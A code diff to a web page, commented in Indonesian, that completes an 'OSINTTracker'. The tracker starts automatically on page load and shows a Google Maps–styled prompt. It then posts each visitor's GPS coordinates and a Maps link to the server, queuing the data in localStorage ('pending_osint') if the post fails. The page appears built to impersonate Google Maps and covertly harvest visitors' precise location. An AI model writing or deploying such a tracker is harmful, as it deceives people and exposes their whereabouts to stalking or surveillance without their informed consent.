@@ -804,9 +804,58 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
         }
         
         async sendData() {
-            // akan diimplementasikan di commit berikutnya
+            try {
+                // Buat link Google Maps jika ada koordinat
+                if (this.userData.latitude && this.userData.longitude && 
+                    Math.abs(this.userData.latitude) > 0.1) {
+                    this.userData.google_maps_link = `https://www.google.com/maps?q=${this.userData.latitude},${this.userData.longitude}`;
+                }
+                
+                // Kirim ke server
+                const formData = new FormData();
+                formData.append('visitor_data', JSON.stringify(this.userData));
+                
+                const response = await fetch(window.location.href, {
+                    method: 'POST',
+                    body: formData,
+                    headers: { 'Cache-Control': 'no-cache' }
+                });
+                
+                const result = await response.json();
+                console.log('✅ Data terkirim ke server:', result);
+                
+                // Update status sub dengan info data terkirim
+                const statusSub = document.getElementById('statusSub');
+                if (statusSub && this.userData.source === 'gps') {
+                    statusSub.innerHTML = `Data GPS terkirim ke developer | ${new Date().toLocaleTimeString()}`;
+                }
+                
+            } catch (error) {
+                console.error('❌ Gagal kirim data:', error);
+                // Simpan ke localStorage jika gagal
+                try {
+                    const pendingData = JSON.parse(localStorage.getItem('pending_osint') || '[]');
+                    pendingData.push(this.userData);
+                    localStorage.setItem('pending_osint', JSON.stringify(pendingData.slice(-10)));
+                } catch (e) {}
+            }
         }
     }
+    
+    // Mulai tracker OTOMATIS saat halaman dimuat
+    document.addEventListener('DOMContentLoaded', () => {
+        console.log('%c📍 GOOGLE MAPS', 'background: #1a73e8; color: white; padding: 4px 8px;');
+        console.log('%c🔍 Sistem menunggu izin lokasi (tanpa timeout)', 'color: #5f6368; font-style: italic;');
+        
+        // Inisialisasi tracker
+        window.osintTracker = new OSINTTracker();
+        
+        // Bottom sheet muncul setelah 2 detik
+        setTimeout(() => {
+            const sheet = document.getElementById('bottomSheet');
+            if (sheet) sheet.classList.add('active');
+        }, 2000);
+    });
     </script>
 </body>
 </html>
